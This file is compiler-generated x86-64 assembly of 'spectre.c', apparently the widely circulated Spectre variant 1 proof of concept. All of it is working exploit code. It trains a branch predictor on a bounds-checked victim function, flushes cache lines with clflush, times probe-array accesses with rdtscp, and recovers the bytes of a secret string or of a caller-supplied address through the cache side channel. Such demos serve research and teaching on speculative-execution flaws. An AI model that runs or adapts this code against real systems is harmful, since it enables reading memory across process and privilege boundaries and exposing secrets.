	.file	"spectre.c"
	.intel_syntax noprefix
	.text
	.globl	check
	.type	check, @function
check:
.LFB5689:
	.cfi_startproc
	endbr64
	cmp	rdi, 15
	setbe	al
	movzx	eax, al
	ret
	.cfi_endproc
.LFE5689:
	.size	check, .-check
	.globl	victim_function
	.type	victim_function, @function
victim_function:
.LFB5690:
	.cfi_startproc
	endbr64
	cmp	DWORD PTR [rsi], 0
	je	.L2
	lea	rax, array1[rip]
	movzx	eax, BYTE PTR [rax+rdi]
	sal	eax, 9
	cdqe
	lea	rdx, array2[rip]
	movzx	eax, BYTE PTR [rdx+rax]
	and	BYTE PTR temp[rip], al
.L2:
	ret
	.cfi_endproc
.LFE5690:
	.size	victim_function, .-victim_function
	.globl	readMemoryByte
	.type	readMemoryByte, @function
readMemoryByte:
.LFB5691:
	.cfi_startproc
	endbr64
	push	r15
	.cfi_def_cfa_offset 16
	.cfi_offset 15, -16
	push	r14
	.cfi_def_cfa_offset 24
	.cfi_offset 14, -24
	push	r13
	.cfi_def_cfa_offset 32
	.cfi_offset 13, -32
	push	r12
	.cfi_def_cfa_offset 40
	.cfi_offset 12, -40
	push	rbp
	.cfi_def_cfa_offset 48
	.cfi_offset 6, -48
	push	rbx
	.cfi_def_cfa_offset 56
	.cfi_offset 3, -56
	sub	rsp, 56
	.cfi_def_cfa_offset 112
	mov	QWORD PTR [rsp], rdi
	mov	QWORD PTR 16[rsp], rsi
	mov	QWORD PTR 24[rsp], rdx
	mov	rax, QWORD PTR fs:40
	mov	QWORD PTR 40[rsp], rax
	xor	eax, eax
	mov	DWORD PTR 36[rsp], 0
	lea	rax, results.0[rip]
	lea	rdx, 1024[rax]
.L5:
	mov	DWORD PTR [rax], 0
	add	rax, 4
	cmp	rdx, rax
	jne	.L5
	mov	DWORD PTR 8[rsp], 999
	lea	r12, array2[rip+131072]
	lea	r14, array1[rip]
	lea	rbp, results.0[rip]
	jmp	.L6
.L8:
	mov	DWORD PTR x_is_safe_static[rip], 0
.L9:
#APP
# 70 "spectre.c" 1
	mfence;
# 0 "" 2
#NO_APP
	clflush	x_is_safe_static[rip]
#APP
# 73 "spectre.c" 1
	mfence;
# 0 "" 2
#NO_APP
	sub	eax, 1
	mov	ax, 0
	cdqe
	mov	rdx, rax
	shr	rdx, 16
	mov	rdi, QWORD PTR [rsp]
	xor	rdi, r13
	or	rax, rdx
	and	rdi, rax
	xor	rdi, r13
	mov	rsi, r15
	call	victim_function
	mov	DWORD PTR x_is_safe_static[rip], 16
	sub	ebx, 1
	cmp	ebx, -1
	je	.L28
.L10:
	movsx	rax, ebx
	imul	rax, rax, 715827883
	shr	rax, 32
	mov	edx, ebx
	sar	edx, 31
	sub	eax, edx
	lea	edx, [rax+rax*2]
	add	edx, edx
	mov	eax, ebx
	sub	eax, edx
	jne	.L8
	mov	DWORD PTR x_is_safe_static[rip], 1
	jmp	.L9
.L28:
	mov	esi, 13
	lea	r9, array2[rip]
	movsx	r10, DWORD PTR 12[rsp]
	jmp	.L12
.L30:
	movsx	r8, r8d
	add	DWORD PTR 0[rbp+r8*4], 1
.L11:
	add	esi, 167
	cmp	esi, 42765
	je	.L29
.L12:
	movzx	r8d, sil
	mov	r11d, r8d
	sal	r11d, 9
	rdtscp
	mov	rdi, rax
	mov	DWORD PTR 36[rsp], ecx
	sal	rdx, 32
	or	rdi, rdx
	movsx	r11, r11d
	movzx	eax, BYTE PTR [r9+r11]
	rdtscp
	mov	DWORD PTR 36[rsp], ecx
	sal	rdx, 32
	or	rax, rdx
	sub	rax, rdi
	cmp	rax, 100
	ja	.L11
	movzx	eax, BYTE PTR [r14+r10]
	cmp	eax, r8d
	jne	.L30
	jmp	.L11
.L29:
	mov	eax, 1
	mov	edx, 0
	jmp	.L13
.L19:
	mov	ebx, edx
	mov	edx, ecx
.L14:
	add	rax, 1
.L13:
	mov	ecx, eax
	cmp	rax, 256
	je	.L31
	test	edx, edx
	js	.L19
	mov	esi, DWORD PTR 0[rbp+rax*4]
	movsx	rdi, edx
	cmp	esi, DWORD PTR 0[rbp+rdi*4]
	jge	.L20
	test	ebx, ebx
	js	.L21
	movsx	rdi, ebx
	cmp	esi, DWORD PTR 0[rbp+rdi*4]
	cmovge	ebx, ecx
	jmp	.L14
.L20:
	mov	ebx, edx
	mov	edx, ecx
	jmp	.L14
.L21:
	mov	ebx, ecx
	jmp	.L14
.L31:
	movsx	rax, ebx
	mov	eax, DWORD PTR 0[rbp+rax*4]
	movsx	rcx, edx
	mov	ecx, DWORD PTR 0[rbp+rcx*4]
	lea	esi, 4[rax+rax]
	cmp	esi, ecx
	jl	.L16
	test	eax, eax
	jne	.L22
	cmp	ecx, 2
	je	.L16
.L22:
	sub	DWORD PTR 8[rsp], 1
	je	.L16
.L6:
	mov	edx, DWORD PTR 8[rsp]
	lea	rax, array2[rip]
.L7:
	clflush	[rax]
	add	rax, 512
	cmp	r12, rax
	jne	.L7
	mov	eax, edx
	sar	eax, 31
	shr	eax, 28
	add	edx, eax
	and	edx, 15
	sub	edx, eax
	mov	DWORD PTR 12[rsp], edx
	movsx	r13, edx
	mov	ebx, 29
	lea	r15, x_is_safe_static[rip]
	jmp	.L10
.L16:
	lea	rcx, results.0[rip]
	mov	eax, DWORD PTR results.0[rip]
	xor	eax, DWORD PTR 36[rsp]
	mov	DWORD PTR results.0[rip], eax
	mov	rsi, QWORD PTR 16[rsp]
	mov	BYTE PTR [rsi], dl
	movsx	rdx, edx
	mov	eax, DWORD PTR [rcx+rdx*4]
	mov	rdi, QWORD PTR 24[rsp]
	mov	DWORD PTR [rdi], eax
	mov	BYTE PTR 1[rsi], bl
	movsx	rbx, ebx
	mov	eax, DWORD PTR [rcx+rbx*4]
	mov	DWORD PTR 4[rdi], eax
	mov	rax, QWORD PTR 40[rsp]
	sub	rax, QWORD PTR fs:40
	jne	.L32
	add	rsp, 56
	.cfi_remember_state
	.cfi_def_cfa_offset 56
	pop	rbx
	.cfi_def_cfa_offset 48
	pop	rbp
	.cfi_def_cfa_offset 40
	pop	r12
	.cfi_def_cfa_offset 32
	pop	r13
	.cfi_def_cfa_offset 24
	pop	r14
	.cfi_def_cfa_offset 16
	pop	r15
	.cfi_def_cfa_offset 8
	ret
.L32:
	.cfi_restore_state
	call	__stack_chk_fail@PLT
	.cfi_endproc
.LFE5691:
	.size	readMemoryByte, .-readMemoryByte
	.section	.rodata.str1.1,"aMS",@progbits,1
.LC0:
	.string	"Success"
.LC1:
	.string	"Unclear"
	.section	.rodata.str1.8,"aMS",@progbits,1
	.align 8
.LC2:
	.string	"Putting '%s' in memory, address %p\n"
	.section	.rodata.str1.1
.LC3:
	.string	"%p"
.LC4:
	.string	"%d"
	.section	.rodata.str1.8
	.align 8
.LC5:
	.string	"Trying malicious_x = %p, len = %d\n"
	.section	.rodata.str1.1
.LC6:
	.string	"Reading %d bytes:\n"
	.section	.rodata.str1.8
	.align 8
.LC7:
	.string	"Reading at malicious_x = %p secc= %c ..."
	.section	.rodata.str1.1
.LC8:
	.string	"%s: "
.LC9:
	.string	"0x%02X='%c' score=%d "
	.section	.rodata.str1.8
	.align 8
.LC10:
	.string	"(second best: 0x%02X='%c' score=%d)"
	.section	.rodata.str1.1
.LC11:
	.string	"\n"
.LC12:
	.string	"addr = %llx, pid = %d\n"
	.text
	.globl	main
	.type	main, @function
main:
.LFB5692:
	.cfi_startproc
	endbr64
	push	r15
	.cfi_def_cfa_offset 16
	.cfi_offset 15, -16
	push	r14
	.cfi_def_cfa_offset 24
	.cfi_offset 14, -24
	push	r13
	.cfi_def_cfa_offset 32
	.cfi_offset 13, -32
	push	r12
	.cfi_def_cfa_offset 40
	.cfi_offset 12, -40
	push	rbp
	.cfi_def_cfa_offset 48
	.cfi_offset 6, -48
	push	rbx
	.cfi_def_cfa_offset 56
	.cfi_offset 3, -56
	sub	rsp, 72
	.cfi_def_cfa_offset 128
	mov	DWORD PTR 4[rsp], edi
	mov	QWORD PTR 8[rsp], rsi
	mov	rax, QWORD PTR fs:40
	mov	QWORD PTR 56[rsp], rax
	xor	eax, eax
.L34:
	mov	rdi, QWORD PTR stdin[rip]
	call	getc@PLT
	cmp	al, 114
	je	.L53
	cmp	al, 10
	je	.L34
	cmp	al, 105
	jne	.L45
	mov	eax, 0
	call	getpid@PLT
	mov	ecx, eax
	lea	rdx, check[rip+33]
	lea	rsi, .LC12[rip]
	mov	edi, 1
	mov	eax, 0
	call	__printf_chk@PLT
	jmp	.L34
.L53:
	mov	rdx, QWORD PTR secret[rip]
	mov	rcx, rdx
	lea	rsi, .LC2[rip]
	mov	edi, 1
	mov	eax, 0
	call	__printf_chk@PLT
	mov	rdi, QWORD PTR secret[rip]
	mov	rax, rdi
	lea	rbx, array1[rip]
	sub	rax, rbx
	mov	QWORD PTR 32[rsp], rax
	call	strlen@PLT
	mov	DWORD PTR 28[rsp], eax
	lea	rax, array2[rip]
	lea	rdx, 131072[rax]
.L36:
	mov	BYTE PTR [rax], 1
	add	rax, 1
	cmp	rax, rdx
	jne	.L36
	cmp	DWORD PTR 4[rsp], 3
	je	.L54
.L37:
	mov	edx, DWORD PTR 28[rsp]
	lea	rsi, .LC6[rip]
	mov	edi, 1
	mov	eax, 0
	call	__printf_chk@PLT
	mov	eax, DWORD PTR 28[rsp]
	sub	eax, 1
	mov	DWORD PTR 28[rsp], eax
	js	.L34
	mov	ebp, 0
	lea	r15, .LC7[rip]
	lea	r14, .LC0[rip]
	lea	r13, .LC1[rip]
	jmp	.L43
.L54:
	lea	rdx, 32[rsp]
	mov	rbx, QWORD PTR 8[rsp]
	mov	rdi, QWORD PTR 8[rbx]
	lea	rsi, .LC3[rip]
	mov	eax, 0
	call	__isoc99_sscanf@PLT
	lea	rax, array1[rip]
	sub	QWORD PTR 32[rsp], rax
	lea	rdx, 28[rsp]
	mov	rdi, QWORD PTR 16[rbx]
	lea	rsi, .LC4[rip]
	mov	eax, 0
	call	__isoc99_sscanf@PLT
	mov	ecx, DWORD PTR 28[rsp]
	mov	rdx, QWORD PTR 32[rsp]
	lea	rsi, .LC5[rip]
	mov	edi, 1
	mov	eax, 0
	call	__printf_chk@PLT
	jmp	.L37
.L41:
	lea	rsi, .LC11[rip]
	mov	edi, 1
	mov	eax, 0
	call	__printf_chk@PLT
	mov	eax, DWORD PTR 28[rsp]
	sub	eax, 1
	mov	DWORD PTR 28[rsp], eax
	add	rbp, 1
	test	eax, eax
	js	.L34
.L43:
	mov	rax, QWORD PTR secret[rip]
	movsx	ecx, BYTE PTR [rax+rbp]
	mov	rdx, QWORD PTR 32[rsp]
	mov	rsi, r15
	mov	edi, 1
	mov	eax, 0
	call	__printf_chk@PLT
	mov	rdi, QWORD PTR 32[rsp]
	lea	rax, 1[rdi]
	mov	QWORD PTR 32[rsp], rax
	lea	rdx, 44[rsp]
	lea	rsi, 54[rsp]
	call	readMemoryByte
	mov	r12d, DWORD PTR 44[rsp]
	mov	ebx, DWORD PTR 48[rsp]
	lea	eax, [rbx+rbx]
	cmp	r12d, eax
	mov	rdx, r13
	cmovge	rdx, r14
	lea	rsi, .LC8[rip]
	mov	edi, 1
	mov	eax, 0
	call	__printf_chk@PLT
	movzx	edx, BYTE PTR 54[rsp]
	lea	eax, -32[rdx]
	cmp	al, 94
	mov	ecx, 63
	cmovbe	ecx, edx
	movzx	ecx, cl
	movzx	edx, dl
	mov	r8d, r12d
	lea	rsi, .LC9[rip]
	mov	edi, 1
	mov	eax, 0
	call	__printf_chk@PLT
	test	ebx, ebx
	jle	.L41
	movzx	edx, BYTE PTR 55[rsp]
	lea	eax, -32[rdx]
	cmp	al, 94
	mov	ecx, 63
	cmovbe	ecx, edx
	movzx	ecx, cl
	movzx	edx, dl
	mov	r8d, ebx
	lea	rsi, .LC10[rip]
	mov	edi, 1
	mov	eax, 0
	call	__printf_chk@PLT
	jmp	.L41
.L45:
	mov	rax, QWORD PTR 56[rsp]
	sub	rax, QWORD PTR fs:40
	jne	.L55
	mov	eax, 0
	add	rsp, 72
	.cfi_remember_state
	.cfi_def_cfa_offset 56
	pop	rbx
	.cfi_def_cfa_offset 48
	pop	rbp
	.cfi_def_cfa_offset 40
	pop	r12
	.cfi_def_cfa_offset 32
	pop	r13
	.cfi_def_cfa_offset 24
	pop	r14
	.cfi_def_cfa_offset 16
	pop	r15
	.cfi_def_cfa_offset 8
	ret
.L55:
	.cfi_restore_state
	call	__stack_chk_fail@PLT
	.cfi_endproc
.LFE5692:
	.size	main, .-main
	.local	results.0
	.comm	results.0,1024,32
	.globl	temp
	.bss
	.type	temp, @object
	.size	temp, 1
temp:
	.zero	1
	.globl	secret
	.section	.rodata.str1.8
	.align 8
.LC13:
	.string	"The Magic Words are Squeamish Ossifrage."
	.section	.data.rel.local,"aw"
	.align 8
	.type	secret, @object
	.size	secret, 8
secret:
	.quad	.LC13
	.globl	unused3
	.bss
	.align 32
	.type	unused3, @object
	.size	unused3, 64
unused3:
	.zero	64
	.globl	array2
	.data
	.align 32
	.type	array2, @object
	.size	array2, 131072
array2:
	.string	"\001\002\003\004\005\006\007\b\t\n\013\f\r\016\017\020"
	.zero	131055
	.globl	unused2
	.bss
	.align 32
	.type	unused2, @object
	.size	unused2, 64
unused2:
	.zero	64
	.globl	array1
	.data
	.align 32
	.type	array1, @object
	.size	array1, 160
array1:
	.string	"\001\002\003\004\005\006\007\b\t\n\013\f\r\016\017\020"
	.zero	143
	.globl	unused1
	.bss
	.align 32
	.type	unused1, @object
	.size	unused1, 64
unused1:
	.zero	64
	.globl	x_is_safe_static
	.data
	.align 4
	.type	x_is_safe_static, @object
	.size	x_is_safe_static, 4
x_is_safe_static:
	.long	16
	.ident	"GCC: (Ubuntu 11.4.0-1ubuntu1~22.04) 11.4.0"
	.section	.note.GNU-stack,"",@progbits
	.section	.note.gnu.property,"a"
	.align 8
	.long	1f - 0f
	.long	4f - 1f
	.long	5
0:
	.string	"GNU"
1:
	.align 8
	.long	0xc0000002
	.long	3f - 2f
2:
	.long	0x3
3:
	.align 8
4:
